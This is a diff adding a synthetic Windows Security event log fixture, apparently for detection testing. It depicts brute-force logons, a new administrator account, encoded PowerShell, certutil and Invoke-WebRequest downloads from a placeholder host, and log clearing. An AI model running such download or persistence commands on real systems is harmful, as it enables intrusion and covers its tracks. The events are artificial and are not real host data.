@@ -1,0 +1,158 @@
+{
+  "comment": "SYNTHETIC Windows Security export. Not from a real host. RFC 5737 addresses only. The encoded PowerShell string decodes to the letters Acme; it is not a payload.",
+  "events": [
+    {
+      "EventID": 4624,
+      "TimeCreated": "2026-10-27T09:15:00Z",
+      "Computer": "win-demo",
+      "TargetUserName": "ops",
+      "SubjectUserName": "ops",
+      "IpAddress": "192.0.2.25",
+      "LogonType": 3
+    },
+    {
+      "EventID": 4624,
+      "TimeCreated": "2026-10-27T09:16:00Z",
+      "Computer": "win-demo",
+      "TargetUserName": "SYSTEM",
+      "IpAddress": "-",
+      "LogonType": 5
+    },
+    {
+      "EventID": 4688,
+      "TimeCreated": "2026-10-27T10:00:00Z",
+      "Computer": "win-demo",
+      "SubjectUserName": "ops",
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command Get-Date"
+    },
+    {
+      "EventID": 4688,
+      "TimeCreated": "2026-10-27T10:01:00Z",
+      "Computer": "win-demo",
+      "SubjectUserName": "ops",
+      "NewProcessName": "C:\\Windows\\System32\\svchost.exe",
+      "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs"
+    },
+    {
+      "EventID": 4732,
+      "TimeCreated": "2026-10-27T11:00:00Z",
+      "Computer": "win-demo",
+      "SubjectUserName": "Administrator",
+      "MemberName": "ops",
+      "TargetUserName": "Users",
+      "GroupName": "Users"
+    },
+    {
+      "EventID": 4625,
+      "TimeCreated": "2026-10-27T13:00:00.1234567Z",
+      "Computer": "win-demo",
+      "TargetUserName": "Administrator",
+      "IpAddress": "203.0.113.40",
+      "LogonType": 3,
+      "Status": "0xC000006D"
+    },
+    {
+      "EventID": 4625,
+      "TimeCreated": "2026-10-27T13:00:15Z",
+      "Computer": "win-demo",
+      "TargetUserName": "Administrator",
+      "IpAddress": "203.0.113.40",
+      "LogonType": 3
+    },
+    {
+      "EventID": 4625,
+      "TimeCreated": "2026-10-27T13:00:30Z",
+      "Computer": "win-demo",
+      "TargetUserName": "Administrator",
+      "IpAddress": "203.0.113.40",
+      "LogonType": 3
+    },
+    {
+      "EventID": 4625,
+      "TimeCreated": "2026-10-27T13:00:45Z",
+      "Computer": "win-demo",
+      "TargetUserName": "Administrator",
+      "IpAddress": "203.0.113.40",
+      "LogonType": 3
+    },
+    {
+      "EventID": 4625,
+      "TimeCreated": "2026-10-27T13:01:00Z",
+      "Computer": "win-demo",
+      "TargetUserName": "Administrator",
+      "IpAddress": "203.0.113.40",
+      "LogonType": 3
+    },
+    {
+      "EventID": 4625,
+      "TimeCreated": "2026-10-27T13:01:15Z",
+      "Computer": "win-demo",
+      "TargetUserName": "Administrator",
+      "IpAddress": "203.0.113.40",
+      "LogonType": 3
+    },
+    {
+      "EventID": 4624,
+      "TimeCreated": "2026-10-27T13:02:00Z",
+      "Computer": "win-demo",
+      "TargetUserName": "Administrator",
+      "IpAddress": "203.0.113.40",
+      "LogonType": 10
+    },
+    {
+      "EventID": 4720,
+      "TimeCreated": "2026-10-27T18:10:00Z",
+      "Computer": "win-demo",
+      "TargetUserName": "svcbackup",
+      "SubjectUserName": "Administrator"
+    },
+    {
+      "EventID": 4732,
+      "TimeCreated": "2026-10-27T18:11:00Z",
+      "Computer": "win-demo",
+      "SubjectUserName": "Administrator",
+      "MemberName": "svcbackup",
+      "TargetUserName": "Administrators",
+      "GroupName": "Administrators"
+    },
+    {
+      "EventID": 4688,
+      "TimeCreated": "2026-10-27T18:20:00Z",
+      "Computer": "win-demo",
+      "SubjectUserName": "Administrator",
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -NoProfile -EncodedCommand QQBjAG0AZQA="
+    },
+    {
+      "EventID": 4688,
+      "TimeCreated": "2026-10-27T18:21:00Z",
+      "Computer": "win-demo",
+      "SubjectUserName": "Administrator",
+      "NewProcessName": "C:\\Windows\\System32\\certutil.exe",
+      "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.80/tool.bin C:\\Users\\Public\\tool.bin"
+    },
+    {
+      "EventID": 4688,
+      "TimeCreated": "2026-10-27T18:22:00Z",
+      "Computer": "win-demo",
+      "SubjectUserName": "Administrator",
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -NoProfile -Command \"Invoke-WebRequest -OutFile C:\\Users\\Public\\note.txt http://203.0.113.80/note.txt\""
+    },
+    {
+      "EventID": 1102,
+      "TimeCreated": "2026-10-27T18:30:00Z",
+      "Computer": "win-demo",
+      "SubjectUserName": "Administrator"
+    },
+    {
+      "EventID": 4624,
+      "TimeCreated": "2026-10-27T23:15:00Z",
+      "Computer": "win-demo",
+      "TargetUserName": "analyst",
+      "IpAddress": "198.51.100.77",
+      "LogonType": 10
+    }
+  ]
+}
